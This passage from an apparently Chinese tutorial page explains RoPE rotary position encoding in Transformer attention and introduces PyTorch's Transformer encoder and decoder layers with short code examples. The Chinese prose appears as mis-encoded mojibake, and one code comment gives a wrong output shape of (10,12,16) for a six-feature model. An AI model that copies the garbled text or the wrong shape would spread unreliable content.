<p>åœ¨Transformerä¸­ï¼Œåªéœ€è¦å¯¹ç¼–ç å™¨ä¸­çš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>çŸ©é˜µå’Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>çŸ©é˜µè¿›è¡ŒRoPEå˜æ¢(<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>K</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q = RoPE(Q),K = RoPE(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></span>)å°±è¡Œï¼Œå…¶å®ƒçš„æ“ä½œæµç¨‹å®Œå…¨ä¸å˜ï¼Œæ³¨æ„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>çŸ©é˜µä¸éœ€è¦è¿›è¡ŒRoPEå˜æ¢ï¼Œå¹¶ä¸”RoPEæ—‹è½¬ä½ç½®ç¼–ç åº”è¯¥åœ¨ç¼–ç å™¨çš„æ¯ä¸€å±‚éƒ½å¯¹<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>å’Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>åº”ç”¨ã€‚è¿™æ ·å°±å¯ä»¥å»æ‰åŸå§‹è®ºæ–‡çš„æ¶æ„å›¾ä¸Šçš„ä½ç½®ç¼–ç æ“ä½œäº†ã€‚</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><mo>â‹…</mo><msub><mi>W</mi><mi>q</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mo>=</mo><mi>X</mi><mo>â‹…</mo><msub><mi>W</mi><mi>k</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>V</mi><mo>=</mo><mi>X</mi><mo>â‹…</mo><msub><mi>W</mi><mi>v</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}
Q = X\cdot W_{q} &amp; (seq\_len,k)
 \\
K = X\cdot W_{k} &amp; (seq\_len,k)
 \\
V = X\cdot W_{v} &amp; (seq\_len,out\_size) 
\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"/><mi>K</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q = RoPE(Q)\\
K = RoPE(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mfrac><mrow><mi>Q</mi><mo>â‹…</mo><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>k</mi></msqrt></mfrac><mtext>Â Â Â </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P = \frac{Q \cdot K^T }{\sqrt{k}}\space\space\space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p>å¦‚æœä½ æƒ³å¯¹RoPEæœ‰æ›´åŠ æ·±å±‚æ¬¡çš„ç†è§£ï¼Œéå¸¸æ¨èè§‚çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1CQoaY2EU2%2F" target="_blank" title="https://www.bilibili.com/video/BV1CQoaY2EU2/" ref="nofollow noopener noreferrer">ä½œè€…æ­¦è¾°</a>çš„è§†é¢‘è®²è§£</p>
<p>ä¸è¦çœ‹åˆ°RoPEè¿™ä¹ˆå¤æ‚å°±æ„Ÿåˆ°å®³æ€•ï¼Œä½ åªéœ€æŠŠæ¡ä¸€ä¸ªæ ¸å¿ƒæœ¬è´¨ï¼š<strong>å®ƒä»¬æœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹åŸå§‹æ³¨æ„åŠ›åˆ†æ•°çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">QK^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0358em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span> è¿›è¡Œä¿®æ­£ã€‚</strong> æ— è®ºå…·ä½“æ“ä½œæ˜¯åŠ ä¸€ä¸ªåç½®é¡¹ï¼Œè¿˜æ˜¯å¯¹æŸ¥è¯¢å’Œé”®è¿›è¡Œæ—‹è½¬ï¼Œå…¶æ ¹æœ¬ç›®çš„éƒ½æ˜¯å˜ç€æ³•å­è®©æ¨¡å‹å»ºç«‹èµ·â€œè·ç¦»â€ä¸â€œå…³æ³¨åº¦â€ä¹‹é—´çš„å…³ç³»ï¼šè®©ç›¸è·è¾ƒè¿œçš„è¯å¯¹ï¼ˆå¯¹åº”çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">qk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> æ³¨æ„åŠ›åˆ†æ•°ï¼‰å—åˆ°æŠ‘åˆ¶ï¼Œè®©ç›¸è·è¾ƒè¿‘çš„è¯å¯¹å¾—åˆ°å¢å¼ºã€‚</p>
<p>å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªå›¾æ¥ç®€å•çš„ç†è§£ï¼Œè·ç¦»è¶Šè¿œçš„è¯ï¼Œå…¶æ³¨æ„åŠ›æƒé‡å°±ä¼šä¹˜ä»¥ä¸€ä¸ªè¶Šå°ç³»æ•°</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecf8b23bae1046569b9fd217742a106f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=cYTKzX9CdeyeBiG8d3NWJ5Bfo%2F8%3D" alt="c19.jpg" width="90%" loading="lazy"/></p>
<p>åªè¦ä½ ç†è§£äº†è¿™ä¸ªæœ¬è´¨ï¼Œæœªæ¥ä½ ä¹Ÿå¯ä»¥è®¾è®¡ä¸€ä¸ªæ–°çš„ä½ç½®ç¼–ç ç®—æ³•ã€‚</p>
<h3 data-id="heading-2">é™„å½•2ï¼šPytorchä¸­çš„Transformerç»„ä»¶</h3>
<blockquote>
<p>å¦‚ä½•ç”¨Pytorchå¿«é€Ÿæ­å»ºTransformerä¸­çš„ç»„ä»¶ï¼Ÿå…¶å®Pytorchä¸­æœ‰ç°æˆçš„Transformerç»„ä»¶å‡½æ•°ï¼Œéƒ½æ‰“åŒ…å¥½äº†ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œä¸‹é¢å°±ä¸€ä¸€è®²è§£ï¼Œè‹¥æƒ³æ›´åŠ æ·±å…¥çš„ç†è§£å­¦ä¹ ï¼Œæ¨èè‡ªè¡ŒæŸ¥é˜…<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.pytorch.org%2Fdocs%2Fstable%2Fgenerated%2Ftorch.nn.TransformerEncoderLayer.html" target="_blank" title="https://docs.pytorch.org/docs/stable/generated/torch.nn.TransformerEncoderLayer.html" ref="nofollow noopener noreferrer">å®˜æ–¹æ‰‹å†Œ</a></p>
</blockquote>
<p><strong>a2.1 TransformerEncoderLayer</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d3d730aa5b447391c682b9dc94a6ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=9kF02SJHbNkw%2FJxbVae59qxLv10%3D" alt="a1.jpg" width="70%" loading="lazy"/></p>
<p><strong>åˆå§‹åŒ–å‚æ•°ï¼š</strong></p>
<ul>
<li><code>d_model</code>: è¾“å…¥åºåˆ—çš„ç‰¹å¾æ•°é‡</li>
<li><code>nhead</code>: å¤šå¤´æ³¨æ„åŠ›çš„å¤´æ•°é‡</li>
<li><code>dim_feedforward</code>: å‰å‘ä¼ æ’­éšè—å±‚æ•°é‡,é»˜è®¤å€¼ä¸º2048</li>
<li><code>batch_first</code>: è¾“å…¥è¾“å‡ºç»´åº¦é¡ºåºï¼Œé»˜è®¤Falseï¼Œä½†ä¸€èˆ¬æƒ…å†µä¸‹å¼ºåˆ¶å…¶ä¸ºTrue</li>
<li><code>dropout</code>: é»˜è®¤ä¸º0.1</li>
<li><code>activation</code>: æ¿€æ´»å‡½æ•°ï¼Œé»˜è®¤ä¸º<code>relu</code>,è¿˜å¯ä»¥ä½¿ç”¨<code>gelu</code>ï¼ˆgeluå¯¹åºåˆ—ä»»åŠ¡è¡¨ç°è¾ƒå¥½ï¼Œä½†æ˜¯è®¡ç®—é‡å¤§ï¼‰</li>
</ul>
<p><strong>è¾“å…¥çŸ©é˜µå½¢çŠ¶ï¼š</strong><code> (batch_size, seq_len, d_model)</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
encoder_layer = nn.TransformerEncoderLayer(d_model=<span class="hljs-number">6</span>, nhead=<span class="hljs-number">6</span>,batch_first=<span class="hljs-literal">True</span>,activation=<span class="hljs-string">"gelu"</span>)
inputs = torch.rand(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>)
output = encoder_layer(inputs)
output.shape	<span class="hljs-comment"># è¾“å‡º(1,10,6)</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ·»åŠ æ©ç </span>
seq_len = <span class="hljs-number">10</span>  <span class="hljs-comment"># åºåˆ—é•¿åº¦</span>
<span class="hljs-comment"># åˆ›å»ºä¸Šä¸‰è§’æ©ç  (å¯¹è§’çº¿ä»¥ä¸Šä¸ºTrue)</span>
src_mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()
output = encoder_layer(inputs, src_mask=src_mask)
output.shape	<span class="hljs-comment"># è¾“å‡º(1,10,6)</span>
</code></pre>
<p>æ³¨æ„ï¼šTransformerç¼–ç å™¨(Encoder)é€šå¸¸ä¸éœ€è¦ä¸Šä¸‰è§’æ©ç ï¼Œå› ä¸ºç¼–ç å™¨åº”è¯¥èƒ½å¤Ÿçœ‹åˆ°æ•´ä¸ªè¾“å…¥åºåˆ—ã€‚ä¸Šä¸‰è§’æ©ç (å› æœæ©ç )é€šå¸¸æ˜¯ç”¨äºè§£ç å™¨(Decoder)ä¸­ï¼Œé˜²æ­¢æ¨¡å‹åœ¨é¢„æµ‹æ—¶çœ‹åˆ°æœªæ¥çš„ä¿¡æ¯</p>
<p><strong>a2.2 TransformerEncoder</strong></p>
<p>å¤šä¸ªTransformerEncoderLayerå †å ç»“æ„</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/928ff01c73a349709830f5cf1fb28f52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=tZ85%2FBLoWN9CSlMU1BsNk%2F1ac%2F8%3D" alt="a2.jpg" loading="lazy"/></p>
<p><strong>åˆå§‹åŒ–å‚æ•°ï¼š</strong></p>
<ul>
<li>
<p><code>encoder_layer</code>: ä¸€ä¸ªTransformerEncoderLayerå±‚å®ä¾‹</p>
</li>
<li>
<p><code>num_layers</code>: å‡ ä¸ªTransformerEncoderLayerå±‚å †å </p>
</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä½¿ç”¨ç¤ºä¾‹</span>
encoder_layer = nn.TransformerEncoderLayer(
    d_model=<span class="hljs-number">6</span>, nhead=<span class="hljs-number">6</span>, batch_first=<span class="hljs-literal">True</span>, activation=<span class="hljs-string">"gelu"</span>
)	<span class="hljs-comment"># å…ˆåˆå§‹åŒ–ä¸€ä¸ªTransformerEncoderLayerå®ä¾‹</span>
transformer_encoder = nn.TransformerEncoder(encoder_layer, num_layers=<span class="hljs-number">4</span>)    <span class="hljs-comment"># 4å±‚å †å </span>
inputs = torch.rand(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>)
outputs = transformer_encoder(inputs)
outputs.shape	<span class="hljs-comment"># è¾“å‡º(10,12,16)</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ·»åŠ æ©ç ï¼Œæ³¨æ„ï¼Œä¸€èˆ¬åœ¨ç¼–ç å™¨ä¸­ä¸åŠ æ©ç </span>
seq_len = <span class="hljs-number">12</span>  <span class="hljs-comment"># åºåˆ—é•¿åº¦</span>
mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()
output = transformer_encoder(inputs, mask=mask)
output.shape	<span class="hljs-comment"># è¾“å‡º(10,12,16)</span>
</code></pre>
<p><strong>a2.3 TransformerDecoderLayer</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15ebbc8621ab451eb8749e1d866e289a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=nHlfIlCKvEZU5fSqPcMssTi9TaY%3D" alt="a3.jpg" loading="lazy"/></p>
<p><strong>åˆå§‹åŒ–å‚æ•°ï¼š</strong></p>
<ul>
<li><code>d_model</code>: è¾“å…¥åºåˆ—çš„ç‰¹å¾æ•°é‡</li>
